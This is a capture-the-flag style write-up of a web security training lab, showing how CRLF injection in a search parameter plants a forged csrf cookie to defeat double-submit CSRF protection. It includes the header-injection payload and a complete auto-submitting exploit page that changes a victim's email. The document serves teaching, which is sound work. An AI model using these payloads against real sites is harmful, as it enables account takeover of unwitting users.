## CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Search page
- Exploit server
- /login


## Resume

1. Login with `wiener:peter`
2. Change your email and capture the request
3. Observe CSRF token validation
4. Abuse CRLF injection in search feature
5. Inject a fake `csrf` cookie
6. Send CSRF exploit with matching fake token

## Solve

First login with your account and update your email once.

Capture the request with Burp Suite :

```http
POST /my-account/change-email HTTP/2
Host: 0ab9005a041cc643806ff84a007d00b0.web-security-academy.net
Cookie: session=YOUR_SESSION; csrf=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv
Content-Type: application/x-www-form-urlencoded

email=toto%40mail.com&csrf=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv
```

The application validates the CSRF protection by simply comparing :

- the `csrf` cookie
- the `csrf` body parameter

If both values match, the request is accepted.

---

Now perform a search request and observe that the search term is reflected inside the `Set-Cookie` response header.

This leads to a CRLF injection vulnerability.

Create the following payload :

```http
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

This injects a fake cookie into the victim browser :

```http
Set-Cookie: csrf=fake; SameSite=None
```

Now generate a CSRF PoC from the email change request and use the same fake value inside the form :

```html
<html>
  <body>

    <form action="https://0ab9005a041cc643806ff84a007d00b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com">
      <input type="hidden" name="csrf" value="76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv">
      <input type="submit" value="Submit request">
    </form>

    <img src="https://0ab9005a041cc643806ff84a007d00b0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=76e3ATeWr5GOr3IxnbhUVhLiXdRR8yRv%3b%20SameSite=None"
         onerror="document.forms[0].submit()">

  </body>
</html>
```

The exploit works in two steps :

1. The `<img>` request injects a forged `csrf` cookie into the victim browser.
2. The form is automatically submitted with the exact same `csrf` value.

Because the application only checks whether the cookie and body parameter match, the CSRF validation succeeds even though the attacker fully controls both values.

Store the payload on the **Exploit Server** and deliver it to the victim.